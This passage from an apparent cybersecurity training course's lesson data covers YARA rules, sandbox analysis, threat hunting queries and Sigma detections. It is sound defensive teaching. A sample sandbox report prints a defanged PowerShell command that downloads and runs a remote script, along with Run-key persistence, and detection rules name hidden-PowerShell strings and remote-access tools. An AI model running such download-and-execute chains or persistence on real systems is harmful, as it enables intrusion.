  <tr><td>Section names <code>UPX0</code>/<code>UPX1</code>, high entropy (&gt; 7.2) sections</td><td>Packed or encrypted content</td></tr>
  <tr><td>Raw size much smaller than virtual size</td><td>Unpacks itself in memory</td></tr>
  <tr><td>Compile timestamp in the future or 1992</td><td>Forged or default (Delphi) timestamp</td></tr>
  <tr><td>Invalid or stolen code-signing certificate</td><td>Evasion &mdash; check revocation and signer</td></tr>
</table>
<p>For .NET samples, decompile with dnSpyEx or ILSpy to read near-source code. For scripts (JS, VBS, PowerShell), deobfuscate step by step in CyberChef or by replacing the final <code>eval</code>/<code>IEX</code> with a print.</p>

<h3>YARA: pattern matching for files and memory</h3>
<p><b>YARA</b> ("the pattern matching swiss knife for malware researchers," created by Victor Alvarez at VirusTotal) describes malware families with text and binary patterns plus conditions. <b>YARA-X</b>, a Rust rewrite, reached stable release in 2025 and is largely compatible with existing rules.</p>
<pre><code>import "pe"

rule CyberPath_ExampleLoader_Oct2026
{
    meta:
        author      = "CyberPath SOC"
        description = "ExampleLoader DLL seen in IR-2026-0142"
        date        = "2026-10-15"
        hash        = "9f2b0c...c41a"
        tlp         = "TLP:AMBER"
        reference   = "IR-2026-0142"

    strings:
        $gate   = "/gate.php" ascii
        $mutex  = "Global\\MtxUpd7731" ascii wide
        $ps     = "powershell -nop -w hidden" ascii wide nocase
        $runkey = "CurrentVersion\\Run" ascii wide
        $xorkey = { 8B 45 ?? 33 C1 88 04 1? 41 3B CA 7C ?? }   // XOR decode loop, wildcards
        $re_ip  = /https?:\\/\\/[0-9]{1,3}(\\.[0-9]{1,3}){3}\\/[a-z]{3,8}\\.php/

    condition:
        uint16(0) == 0x5A4D                      // MZ header
        and filesize &lt; 2MB
        and pe.is_dll()
        and pe.exports("DllRegisterServer")
        and ( $mutex or $xorkey )
        and 2 of ($gate, $ps, $runkey, $re_ip)
}</code></pre>
<ul>
  <li><b>meta</b>: documentation only &mdash; not used in matching.</li>
  <li><b>strings</b>: text (<code>ascii</code>, <code>wide</code> for UTF-16, <code>nocase</code>, <code>fullword</code>, <code>xor</code>, <code>base64</code>), hex with wildcards <code>??</code> and jumps <code>[2-4]</code>, and regular expressions.</li>
  <li><b>condition</b>: boolean logic, counts (<code>#s &gt; 3</code>), offsets (<code>$s at 0</code>), <code>any of them</code>, <code>2 of (...)</code>, file size, and modules (<code>pe</code>, <code>elf</code>, <code>math</code> for entropy, <code>hash</code>, <code>dotnet</code>).</li>
</ul>

<h3>Running YARA</h3>
<pre><code>yara -s -r CyberPath_ExampleLoader.yar C:\\Users\\         # -r recursive, -s show matching strings
yara -p 8 rules/index.yar /mnt/evidence/                   # scan a mounted image with 8 threads
vol -f mem.raw windows.vadyarascan --yara-file CyberPath_ExampleLoader.yar   # scan process memory</code></pre>
<p>YARA rules can also be deployed fleet-wide through Velociraptor, THOR/LOKI scanners, many EDRs, and retro-hunts in VirusTotal or MalwareBazaar.</p>

<h3>Writing good rules</h3>
<ul>
  <li>Prefer strings unique to the family (mutexes, custom C2 paths, PDB paths, unique code sequences) over generic API names that appear in legitimate software.</li>
  <li>Combine a fast, cheap check first (<code>uint16(0) == 0x5A4D</code>, <code>filesize</code>) to improve performance.</li>
  <li>Test against a <b>goodware corpus</b> (e.g., clean Windows system files) to catch false positives, and against several samples of the family to confirm coverage.</li>
  <li>Packed samples hide strings on disk &mdash; scan memory or the unpacked payload instead.</li>
</ul>

<div class="callout tip"><b>Tip:</b> Remember the trio: <b>YARA</b> describes <i>files and memory</i>, <b>Sigma</b> describes <i>log events</i>, <b>Snort/Suricata</b> describe <i>network traffic</i>. Interviewers and exams love asking which one fits a scenario.</div>

<div class="callout real"><b>On the job:</b> After an incident, writing a YARA rule from the recovered sample and sweeping all endpoints (and the email gateway's archive) is a standard scoping step. It often finds dormant copies on hosts where no alert ever fired.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 lists YARA among analysis tools and asks about hashing, strings and static vs dynamic analysis. BTL1 includes static analysis tooling (strings, PEStudio-style analysis, hashing) and basic YARA understanding.</div>
`,
  keyTerms: [
    ["Imphash", "Hash of a PE's import table used to cluster related samples"],
    ["Fuzzy hashing", "Similarity hashing (ssdeep, TLSH) that matches near-identical files"],
    ["FLOSS", "Tool that extracts obfuscated and stack strings from binaries"],
    ["capa", "Tool that identifies capabilities in executables and maps them to ATT&CK"],
    ["Packer", "Tool that compresses or encrypts an executable to hide its contents"],
    ["Entropy", "Measure of randomness; high values suggest packing or encryption"],
    ["YARA", "Pattern-matching language and tool for classifying files and memory"],
    ["YARA condition", "Boolean expression deciding whether a rule matches"]
  ],
  standards: ["MITRE ATT&CK T1027", "MITRE ATT&CK T1055"],
  labs: ["lab-yara", "lab-ioc-triage"]
},
{
  id: "p3-m4-l3",
  module: "p3-m4",
  title: "Dynamic Analysis and Sandboxing",
  minutes: 22,
  objectives: [
    "Perform basic behavioral analysis with Procmon, Process Explorer, Regshot and network simulation",
    "Use automated sandboxes and interpret their reports",
    "Recognize sandbox evasion techniques",
    "Extract actionable IOCs and TTPs from a dynamic analysis run"
  ],
  html: `
<p>Static analysis tells you what a sample <i>could</i> do; dynamic analysis shows what it <i>does</i>. Run it in a controlled environment and record every change.</p>

<h3>Manual behavioral analysis workflow</h3>
<ol>
  <li><b>Prepare</b>: revert the analysis VM to a clean snapshot; start network simulation on REMnux (INetSim) or FakeNet-NG locally; start Wireshark capture.</li>
  <li><b>Baseline</b>: take a Regshot "1st shot" of registry and file system; start <b>Process Monitor</b> (Procmon) with a filter-ready capture and <b>Process Explorer</b> or System Informer.</li>
  <li><b>Execute</b> the sample (sometimes as admin, sometimes as user &mdash; behavior may differ). For DLLs use <code>rundll32 sample.dll,ExportName</code>; for documents, open in the matching application.</li>
  <li><b>Observe</b> for several minutes. Interact if the sample expects it (click through a fake installer).</li>
  <li><b>Collect</b>: Regshot "2nd shot" and compare; save Procmon log (PML/CSV) and PCAP; dump suspicious processes (Process Explorer or procdump) for strings/YARA.</li>
  <li><b>Revert</b> the snapshot.</li>
</ol>

<h3>Useful Procmon filters</h3>
<table>
  <tr><th>Filter</th><th>Finds</th></tr>
  <tr><td>Process Name is sample.exe (and child processes via Process Tree)</td><td>Everything the sample did</td></tr>
  <tr><td>Operation is WriteFile / CreateFile with Path contains AppData or Temp</td><td>Dropped files</td></tr>
  <tr><td>Operation is RegSetValue with Path contains \\Run</td><td>Run-key persistence</td></tr>
  <tr><td>Operation is Process Create</td><td>Spawned children (cmd, powershell, schtasks)</td></tr>
  <tr><td>Operation is TCP Connect / UDP Send</td><td>Network destinations</td></tr>
</table>

<h3>Automated sandboxes</h3>
<p>Sandboxes automate this workflow and produce reports with process trees, network IOCs, dropped files, screenshots, signatures and ATT&amp;CK mappings.</p>
<ul>
  <li><b>Interactive/commercial</b>: ANY.RUN (interactive, you can click inside the VM), Joe Sandbox, VMRay, Hatching Triage (Recorded Future Sandbox), Hybrid Analysis (CrowdStrike Falcon Sandbox).</li>
  <li><b>Open source</b>: CAPE Sandbox (the maintained Cuckoo successor, with config extraction for many families).</li>
  <li><b>Built-in</b>: Defender for Office 365 Safe Attachments detonation, EDR vendor sandboxes, email gateway sandboxes.</li>
</ul>
<h4>Reading a sandbox report (excerpt)</h4>
<pre><code>Verdict: MALICIOUS (score 92/100)   Family: ExampleLoader (config extracted)
Process tree:
  Invoice_8812.lnk -&gt; cmd.exe -&gt; powershell.exe -w hidden -c iwr hxxp://198.51.100[.]40/s.ps1|iex
     -&gt; rundll32.exe %TEMP%\\upd.dll,DllRegisterServer
Network: DNS updcheck-cdn[.]example -&gt; 91.215.85[.]17 ; HTTPS POST /gate.php every 60s
Dropped: %TEMP%\\upd.dll  SHA256 9f2b0c...c41a
Registry: HKCU\\...\\CurrentVersion\\Run\\OneDriveUpdate = rundll32.exe "%TEMP%\\upd.dll",DllRegisterServer
Mutex: Global\\MtxUpd7731
ATT&amp;CK: T1204.002, T1059.001, T1105, T1218.011, T1547.001, T1071.001
Extracted config: C2 = [91.215.85.17:443, updcheck-cdn.example], sleep=60, jitter=20, botnet="oct26"</code></pre>
<p>Everything you need for scoping is here: network IOCs (block and hunt), host IOCs (file, registry, mutex for YARA and EDR hunts) and TTPs (for detection improvement).</p>

<h3>Sandbox evasion</h3>
<ul>
  <li><b>Environment checks</b>: VM artifacts (VMware tools, VirtualBox drivers, MAC prefixes), low CPU count/RAM/disk size, analysis tools running, debugger present.</li>
  <li><b>User-activity checks</b>: no mouse movement, no recent documents, no browser history, short uptime.</li>
  <li><b>Time-based</b>: long sleeps (sandboxes often fast-forward, so malware measures elapsed time), execution only on certain dates.</li>
  <li><b>Targeting</b>: only run if the domain name, keyboard language or geolocation matches the intended victim; many stealers exit on CIS-region keyboard layouts.</li>
  <li><b>Staged delivery</b>: the C2 serves the next stage only to IPs and fingerprints it trusts, so a sandbox sees nothing.</li>
</ul>
<p>Counter-measures: use "realistic" analysis VMs (populated user profiles, more resources), run longer, try multiple sandboxes and OS versions, and use egress through a residential-like VPN when live C2 interaction is approved.</p>

<div class="callout warn"><b>Warning:</b> Detonating a sample with live internet access may contact the attacker's C2, revealing your organization's IP and alerting them, or cause your lab to participate in attacks. Use simulated networks by default and get approval for live detonation through an isolated egress.</div>

<h3>From analysis to action</h3>
<table>
  <tr><th>Output</th><th>Action</th></tr>
  <tr><td>C2 domains/IPs</td><td>Block at DNS/proxy/firewall; retro-hunt 30&ndash;90 days</td></tr>
  <tr><td>File hashes, mutexes, file paths</td><td>EDR hunt and custom IOC blocks; YARA sweep</td></tr>
  <tr><td>Registry persistence</td><td>Hunt fleet-wide for the value name/data</td></tr>
  <tr><td>Behaviors (LNK &rarr; PowerShell &rarr; rundll32)</td><td>New or improved Sigma/EDR detection</td></tr>
  <tr><td>Family attribution</td><td>Pull CTI on the family's typical follow-on activity (e.g., this loader often precedes ransomware)</td></tr>
</table>

<div class="callout tip"><b>Tip:</b> Check whether a sandbox report already exists for the hash before submitting, and prefer private analysis for samples from targeted attacks.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 covers sandboxing as an analysis technique and asks about the risks of detonation. BTL1 tests dynamic analysis tooling (Procmon, Process Explorer, Wireshark, Regshot-style comparisons) and IOC extraction from sandbox reports.</div>
`,
  keyTerms: [
    ["Procmon", "Sysinternals Process Monitor capturing file, registry, process and network activity"],
    ["Regshot", "Tool comparing registry and file system snapshots before and after execution"],
    ["Sandbox", "Automated environment that detonates samples and reports behavior"],
    ["CAPE", "Open-source malware sandbox and Cuckoo successor with config extraction"],
    ["Config extraction", "Recovering malware settings such as C2 addresses and campaign IDs"],
    ["Sandbox evasion", "Techniques malware uses to detect analysis environments and hide behavior"],
    ["Mutex", "Named synchronization object malware uses to avoid reinfection; useful IOC"],
    ["Detonation", "Executing a suspicious file or URL in an analysis environment"]
  ],
  standards: ["MITRE ATT&CK T1497", "NIST SP 800-83 Rev. 1"],
  labs: ["lab-yara", "lab-ioc-triage"]
}
);

/* ===================== p3-m5 Threat Hunting ===================== */
CP.lessons.push(
{
  id: "p3-m5-l1",
  module: "p3-m5",
  title: "Threat Hunting Fundamentals and the PEAK Framework",
  minutes: 20,
  objectives: [
    "Define threat hunting and contrast it with alert triage and detection engineering",
    "Describe the PEAK framework phases and its three hunt types",
    "Write a testable hunt hypothesis",
    "Assess hunting maturity using the Hunting Maturity Model"
  ],
  html: `
<p><b>Threat hunting</b> is the proactive, human-driven search for adversary activity that has evaded existing detections. Its premise is "assume breach": somewhere, something got past the rules. Where alert triage is reactive (a rule told you to look), hunting is proactive (you decide where to look and why).</p>

<h3>Hunting vs. related activities</h3>
<table>
  <tr><th>Activity</th><th>Trigger</th><th>Output</th></tr>
  <tr><td>Alert triage</td><td>A detection fired</td><td>Verdict on that alert</td></tr>
  <tr><td>IOC sweep</td><td>New indicators from intel</td><td>Hits or no hits for known-bad values</td></tr>
  <tr><td><b>Threat hunting</b></td><td>A hypothesis, an anomaly, or a model</td><td>Found incidents, new detections, visibility gaps, better understanding of normal</td></tr>
  <tr><td>Detection engineering</td><td>A requirement or a hunt finding</td><td>Production alert logic</td></tr>
</table>
<p>A hunt that finds no attacker is not a failure. It still validates visibility, documents normal behavior, and often produces a new detection so that next time the machine finds it automatically.</p>

<h3>The PEAK framework</h3>
<p><b>PEAK</b> (Prepare, Execute, Act with Knowledge), published by Splunk's SURGe team in 2023, is a widely used modern hunting framework. Every hunt passes through three phases:</p>
<ol>
  <li><b>Prepare</b> &mdash; select a topic, research the technique, form the hypothesis or question, scope the data and time range, and plan the analysis.</li>
  <li><b>Execute</b> &mdash; gather data, analyze, refine, and escalate any discovered incidents immediately to IR.</li>
  <li><b>Act</b> &mdash; preserve the hunt (documentation, queries), create or improve detections, communicate findings, and feed gaps back (missing logs, hardening ideas).</li>
</ol>
<p><b>Knowledge</b> runs through all three: CTI, organizational context, previous hunts, and analyst expertise.</p>
<h4>Three PEAK hunt types</h4>
<table>
  <tr><th>Type</th><th>Starts with</th><th>Example</th></tr>
  <tr><td><b>Hypothesis-driven</b></td><td>A testable statement about adversary behavior</td><td>"Attackers are using renamed rclone to exfiltrate data from file servers."</td></tr>
  <tr><td><b>Baseline (exploratory data analysis)</b></td><td>Understanding normal for a data source, then finding deviations</td><td>"Profile all scheduled tasks across servers; investigate outliers."</td></tr>
  <tr><td><b>Model-Assisted Threat Hunting (M-ATH)</b></td><td>A machine learning or statistical model that surfaces candidates</td><td>"Cluster PowerShell command lines and review rare clusters," "score DNS names by entropy."</td></tr>
</table>

<h3>Writing a good hypothesis</h3>
<p>A good hypothesis is <b>specific, testable, and grounded</b> in intelligence or knowledge of the environment. Template:</p>
<pre><code>[Actor type / threat] may be [doing behavior / technique] on [assets] which would be visible as [observable] in [data source].

Example:
Ransomware affiliates targeting our sector may be using legitimate RMM tools (T1219) for persistence on servers,
visible as RMM binaries (AnyDesk, ScreenConnect, Atera, Splashtop) executing on hosts outside the approved IT list
in EDR process and network telemetry over the last 30 days.</code></pre>
<p>Bad hypothesis: "Find hackers in the network." Not testable, no data source, no scope.</p>
<p>Sources for hypotheses: CTI reports (what actors in your sector do), ATT&amp;CK coverage gaps, recent incidents and red-team findings, new vulnerabilities in your stack, crown-jewel assets ("how would someone steal our source code?"), and analyst intuition from triage ("we keep seeing weird WMI on finance hosts").</p>

<h3>The Hunting Maturity Model (HMM)</h3>
<table>
  <tr><th>Level</th><th>Description</th></tr>
  <tr><td>HMM0 &ndash; Initial</td><td>Relies on automated alerts; little or no data collection for hunting</td></tr>
  <tr><td>HMM1 &ndash; Minimal</td><td>Searches for IOCs from threat intel</td></tr>
  <tr><td>HMM2 &ndash; Procedural</td><td>Follows hunt procedures created by others</td></tr>
  <tr><td>HMM3 &ndash; Innovative</td><td>Creates new hunt procedures and hypotheses</td></tr>
  <tr><td>HMM4 &ndash; Leading</td><td>Automates successful hunts into detections at scale</td></tr>
</table>
<p>The HMM (David Bianco, Sqrrl) remains a common way to describe program maturity; PEAK incorporates a similar maturity view.</p>

<h3>Prerequisites</h3>
<ul>
  <li><b>Data</b>: process creation with command lines, network connections, DNS, authentication, and enough retention (30&ndash;90+ days).</li>
  <li><b>Tools</b>: SIEM or data lake with a fast query language, EDR hunting console, notebooks (Jupyter with MSTICPy, for example) for statistics.</li>
  <li><b>Time</b>: protected hours. Hunting dies when analysts are always pulled back to the queue.</li>
  <li><b>Knowledge of normal</b>: you cannot find abnormal without knowing your environment.</li>
</ul>

<div class="callout tip"><b>Tip:</b> Start your hunting practice with high-value, low-noise topics: unapproved RMM tools, LSASS access, new services on servers, rare parent-child process pairs, and outbound connections from servers that should never browse the internet.</div>

<div class="callout real"><b>On the job:</b> Many SOCs now give Tier 2 analysts a hunt rotation (e.g., one day per week). Documented hunts with outcomes are excellent portfolio material for promotion and job applications.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.4 covers threat hunting: hypothesis creation, focus areas (configurations, misconfigurations, isolated networks, business-critical assets), indicators, and active defense such as honeypots. Know that hunting is proactive and assumes compromise.</div>
`,
  keyTerms: [
    ["Threat hunting", "Proactive, human-led search for threats that evaded existing detections"],
    ["Assume breach", "Mindset that adversaries may already be present in the environment"],
    ["PEAK", "Prepare, Execute, Act with Knowledge: threat hunting framework from Splunk SURGe"],
    ["Hypothesis-driven hunt", "Hunt testing a specific, evidence-grounded statement about adversary behavior"],
    ["Baseline hunt", "Exploratory analysis establishing normal behavior to reveal anomalies"],
    ["M-ATH", "Model-Assisted Threat Hunting using statistical or ML models to surface leads"],
    ["Hunting Maturity Model", "HMM0-HMM4 scale describing hunting program capability"]
  ],
  standards: ["MITRE ATT&CK T1219"],
  labs: ["lab-siem-hunt"]
},
{
  id: "p3-m5-l2",
  module: "p3-m5",
  title: "Hunting Techniques: Stacking, Baselining and Outliers",
  minutes: 24,
  objectives: [
    "Apply stacking (least frequency of occurrence) to find rare artifacts",
    "Use baselining and time-series analysis to spot deviations",
    "Run practical hunts for persistence, rare parent-child pairs and anomalous authentication in SPL and KQL",
    "Avoid common analytic traps when hunting"
  ],
  html: `
<p>Hunting is mostly about asking the data the right questions. A handful of analytical techniques cover the majority of hunts.</p>

<h3>Core techniques</h3>
<ul>
  <li><b>Searching</b>: look for a specific artifact (a command-line pattern). Simple, but only finds what you already know to look for.</li>
  <li><b>Stacking / Least Frequency of Occurrence (LFO)</b>: count values across many systems and examine the rare ones. Malware is usually on few hosts; legitimate software is on many.</li>
  <li><b>Grouping / clustering</b>: find sets of activity that occur together (e.g., discovery commands run within 2 minutes of each other).</li>
  <li><b>Baselining and time-series</b>: compare current behavior to historical norms per user, host or service.</li>
  <li><b>Visualization</b>: timelines, graphs of logon relationships, heat maps by hour of day.</li>
</ul>

<h3>Hunt 1: Rare persistence via scheduled tasks (stacking)</h3>
<p>Hypothesis: an attacker has created scheduled tasks for persistence on a small number of hosts.</p>
<pre><code>KQL (Defender XDR):
DeviceProcessEvents
| where Timestamp &gt; ago(30d)
| where FileName =~ "schtasks.exe" and ProcessCommandLine has "/create"
| extend TaskRun = extract(@"(?i)/tr\\s+(""[^""]+""|\\S+)", 1, ProcessCommandLine)
| summarize Hosts = dcount(DeviceName), Examples = make_set(DeviceName, 5), Count = count() by TaskRun
| where Hosts &lt;= 3
| order by Hosts asc

SPL (Sysmon):
index=sysmon EventCode=1 Image="*\\schtasks.exe" CommandLine="*/create*" earliest=-30d
| rex field=CommandLine "(?i)/tr\\s+(?&lt;task_run&gt;\\"[^\\"]+\\"|\\S+)"
| stats dc(host) AS hosts values(host) AS examples count BY task_run
| where hosts &lt;= 3
| sort hosts</code></pre>
<p>Review results: tasks running from <code>AppData</code>, <code>ProgramData</code>, <code>Users\\Public</code>, executing script interpreters, or encoded commands are top candidates.</p>

<h3>Hunt 2: Rare parent-child process pairs</h3>
<p>Hypothesis: exploitation or malicious documents cause unusual process lineage.</p>
<pre><code>KQL:
DeviceProcessEvents
| where Timestamp &gt; ago(14d)
| summarize Hosts = dcount(DeviceName), Count = count(), SampleCmd = any(ProcessCommandLine)
    by Parent = tolower(InitiatingProcessFileName), Child = tolower(FileName)
| where Hosts &lt;= 2 and Count &lt; 10
| where Child in ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe")

SPL:
index=sysmon EventCode=1 earliest=-14d
| eval parent=lower(mvindex(split(ParentImage,"\\"),-1)), child=lower(mvindex(split(Image,"\\"),-1))
| search child IN ("cmd.exe","powershell.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe")
| stats dc(host) AS hosts count values(CommandLine) AS cmds BY parent child
| where hosts&lt;=2 AND count&lt;10</code></pre>
<p>Finds like <code>w3wp.exe &rarr; cmd.exe</code> (web shell), <code>sqlservr.exe &rarr; powershell.exe</code>, or <code>vmtoolsd.exe &rarr; cmd.exe</code> on a server deserve immediate investigation.</p>

<h3>Hunt 3: Authentication anomalies (baselining)</h3>
<p>Hypothesis: a compromised account is being used from hosts or at times it never normally uses.</p>
<pre><code>KQL:
let lookback = SecurityEvent
  | where TimeGenerated between (ago(30d) .. ago(1d)) and EventID == 4624 and LogonType in (3, 10)
  | summarize by TargetUserName, Computer;
SecurityEvent
| where TimeGenerated &gt; ago(1d) and EventID == 4624 and LogonType in (3, 10)
| where TargetUserName !endswith "$"
| join kind=leftanti lookback on TargetUserName, Computer
| summarize NewHosts = dcount(Computer), Hosts = make_set(Computer, 20) by TargetUserName
| where NewHosts &gt;= 3
| order by NewHosts desc</code></pre>
<p>The <code>leftanti</code> join returns only user&ndash;host combinations not seen in the previous 29 days. An account suddenly logging on to many new hosts is a lateral-movement lead.</p>

<h3>Hunt 4: Time-of-day deviation</h3>
<pre><code>SPL:
index=wineventlog EventCode=4624 Logon_Type=10 earliest=-30d
| eval hour=strftime(_time,"%H")
| stats count BY Account_Name hour
| eventstats sum(count) AS total BY Account_Name
| eval pct=round(count/total*100,1)
| where pct &lt; 2 AND (hour&lt;"06" OR hour&gt;"21")</code></pre>

<h3>Analytic traps</h3>
<ul>
  <li><b>Confirmation bias</b>: deciding something is malicious and only looking for supporting evidence. Actively look for benign explanations.</li>
  <li><b>Rare is not evil</b>: the rarest binary may be the CFO's niche tax software. Rarity is a lead, not a verdict.</li>
  <li><b>Data gaps</b>: no hits might mean missing telemetry. Confirm the data source covers the hosts you care about.</li>
  <li><b>Scope creep</b>: a hunt with no time box never finishes. Define success criteria in Prepare.</li>
</ul>

<div class="callout warn"><b>Warning:</b> If a hunt finds active malicious activity, stop hunting and escalate to incident response immediately, per PEAK's Execute phase. Do not continue "to see what else they do" without IR leadership deciding that.</div>

<div class="callout tip"><b>Tip:</b> Keep a personal library of hunting queries with a short description, data source and expected false positives. Community resources to borrow from: Microsoft's Sentinel/Defender hunting queries on GitHub, Splunk Security Content, the THOR/Sigma rules, and the Threat Hunter Playbook.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 expects you to recognize hunting techniques and to interpret query output during hunts. Stacking/frequency analysis and baselining are common concepts in BTL1 and SC-200 hunting questions.</div>
`,
  keyTerms: [
    ["Stacking", "Counting artifact occurrences across systems to surface rare outliers"],
    ["Least Frequency of Occurrence", "Principle that malicious artifacts tend to be rare across an environment"],
    ["Baselining", "Measuring normal behavior to detect deviations"],
    ["leftanti join", "KQL join returning rows from the left table with no match on the right"],
    ["Parent-child analysis", "Examining process lineage to find unusual relationships"],
    ["Confirmation bias", "Tendency to favor evidence that supports an existing belief"],
    ["Time-boxing", "Fixing a hunt's duration and success criteria in advance"]
  ],
  standards: ["MITRE ATT&CK T1053.005", "MITRE ATT&CK T1505.003", "MITRE ATT&CK T1078"],
  labs: ["lab-siem-hunt", "lab-windows-events"]
},
{
  id: "p3-m5-l3",
  module: "p3-m5",
  title: "From Hunt to Detection: Documentation, Metrics and Hunt Programs",
  minutes: 18,
  objectives: [
    "Document a hunt so it is repeatable and auditable",
    "Convert hunt findings into production detections and visibility improvements",
    "Measure the value of a threat hunting program",
    "Plan a hunt calendar driven by threat intelligence and ATT&CK coverage"
  ],
  html: `
<p>The "Act" phase of PEAK is where hunting pays off for the whole organization. A hunt that lives only in one analyst's head is wasted; a documented hunt that became a detection protects the company every minute after.</p>

<h3>Hunt documentation template</h3>
<table>
  <tr><th>Field</th><th>Example</th></tr>
  <tr><td>Hunt ID / title</td><td>H-2026-031 &ndash; Unapproved RMM tools on servers</td></tr>
  <tr><td>Type</td><td>Hypothesis-driven (PEAK)</td></tr>
  <tr><td>Hypothesis</td><td>Ransomware affiliates may use RMM tools (T1219) for persistent access on servers</td></tr>
  <tr><td>Intel/rationale</td><td>Sector ISAC TLP:GREEN advisory 2026-09; recent DFIR reports showing RMM abuse in initial access</td></tr>
  <tr><td>Data sources and range</td><td>DeviceProcessEvents, DeviceNetworkEvents, 30 days, all servers (1,240 hosts, 97% EDR coverage)</td></tr>
  <tr><td>Queries</td><td>Linked in Git repo hunts/H-2026-031/ with versions</td></tr>
  <tr><td>Findings</td><td>3 hosts with AnyDesk: 2 approved vendor support (documented), 1 unexplained on FS03 &rarr; escalated IR-2026-0150</td></tr>
  <tr><td>Outcomes</td><td>New detection DET-0412 (RMM execution outside allowlist); visibility gap: 3% of servers lack EDR &rarr; ticket to IT</td></tr>
  <tr><td>Time spent / analyst</td><td>6 hours / R. Diaz</td></tr>
  <tr><td>Re-run cadence</td><td>Automated via detection; manual review quarterly</td></tr>
</table>

<h3>Turning a hunt into a detection</h3>
<p>The hunt query is usually too broad or too expensive to run as an alert. Refine it:</p>
<ol>
  <li><b>Remove the exploratory parts</b> (stacking across 30 days) and focus on the high-signal condition.</li>
  <li><b>Add the allowlist you learned</b> during the hunt, with owners and expiry.</li>
  <li><b>Decide the response</b>: alert, risk score contribution, or automated containment.</li>
  <li><b>Write it as Sigma</b> (or your platform's format), test it, and deploy through detection-as-code.</li>
</ol>
<pre><code>title: Unapproved Remote Monitoring and Management Tool Execution
id: 0c9e1f5d-3a1b-4b8f-9d0e-7f5a2c4b6e21
status: test
description: RMM tool executed on a host where it is not approved (from hunt H-2026-031)
tags:
  - attack.command-and-control
  - attack.t1219
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    - Image|endswith:
        - '\\AnyDesk.exe'
        - '\\ScreenConnect.ClientService.exe'
        - '\\AteraAgent.exe'
        - '\\Splashtop-streamer.exe'
        - '\\rustdesk.exe'
    - Product|contains:
        - 'AnyDesk'
        - 'ScreenConnect'
        - 'RustDesk'
  filter_approved:
    Computer|startswith: 'ITSUPPORT-'
  condition: selection and not filter_approved
falsepositives:
  - Newly approved vendor support sessions not yet added to the allowlist
level: high</code></pre>
<p>Note the use of the <code>Product</code> PE metadata field to catch renamed binaries &mdash; a lesson from the hunt where one RMM binary had been renamed <code>svchost32.exe</code>.</p>

<h3>Other hunt outputs</h3>
<ul>
  <li><b>Visibility gaps</b>: missing log sources, agents not deployed, insufficient retention.</li>
  <li><b>Hardening recommendations</b>: block RMM installs via application control, restrict outbound traffic from servers.</li>
  <li><b>Knowledge</b>: documented baselines ("these 14 scheduled tasks are standard on our servers") that speed up future triage.</li>
  <li><b>Intel</b>: new internal IOCs and TTPs shared with the CTI team and, if appropriate, the community.</li>
</ul>

<h3>Measuring a hunting program</h3>
<table>
  <tr><th>Metric</th><th>Why it matters</th></tr>
  <tr><td>Hunts completed per quarter</td><td>Basic throughput</td></tr>
  <tr><td>Incidents discovered by hunting</td><td>Direct security value (expect low numbers &mdash; that is fine)</td></tr>
  <tr><td>Detections created or improved</td><td>Lasting value; often the most important metric</td></tr>
  <tr><td>Visibility gaps identified and closed</td><td>Improves everything else</td></tr>
  <tr><td>ATT&amp;CK techniques hunted / covered</td><td>Coverage growth over time</td></tr>
  <tr><td>Dwell time of hunt-discovered incidents</td><td>Shows whether hunting shortens attacker time in the environment</td></tr>
</table>
<p>Avoid measuring hunters only on "threats found" &mdash; that incentivizes exaggeration and discourages hunting in areas where the likely answer is "clean."</p>

<h3>Planning a hunt calendar</h3>
<ul>
  <li>Prioritize techniques used by actors in your threat profile (from CTI) where detection coverage is weak (from your ATT&amp;CK Navigator gap layer).</li>
  <li>Mix types: hypothesis-driven hunts from new intel, baseline hunts on new data sources, model-assisted hunts on high-volume data.</li>
  <li>React to events: major new vulnerability in your stack (hunt for exploitation), big public incident in your sector (hunt for its TTPs).</li>
  <li>Re-run successful hunts periodically until they are fully automated.</li>
</ul>

<div class="callout tip"><b>Tip:</b> Store hunts in Git alongside detections. Reviewers can see the query history, and a hunt can be "promoted" to a detection with a pull request &mdash; the same workflow as detection-as-code.</div>

<div class="callout real"><b>On the job:</b> A portfolio of 3&ndash;5 well-documented hunts (on lab or public datasets such as Splunk's Boss of the SOC or the OTRF Security Datasets) with PEAK-style write-ups is one of the strongest things a junior candidate can show a hiring manager.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 Domains 1 and 4 touch on hunting outcomes, process improvement and metrics. Expect questions on what a threat hunt should produce (new detections, documented findings) and on using threat intel to focus hunts.</div>
`,
  keyTerms: [
    ["Hunt documentation", "Record of hypothesis, data, queries, findings and outcomes for repeatability"],
    ["Detection promotion", "Converting a successful hunt query into a production detection"],
    ["Visibility gap", "Missing or insufficient telemetry discovered during a hunt"],
    ["Hunt calendar", "Planned schedule of hunts prioritized by threat intel and coverage gaps"],
    ["Gap layer", "ATT&CK Navigator layer showing techniques relevant to your threats but lacking detection"],
    ["Product metadata", "PE version-info fields such as Product that survive file renaming"],
    ["Act phase", "PEAK phase covering documentation, detection creation and communication"]
  ],
  standards: ["MITRE ATT&CK T1219"],
  labs: ["lab-siem-hunt", "lab-attack-mapping"]
}
);
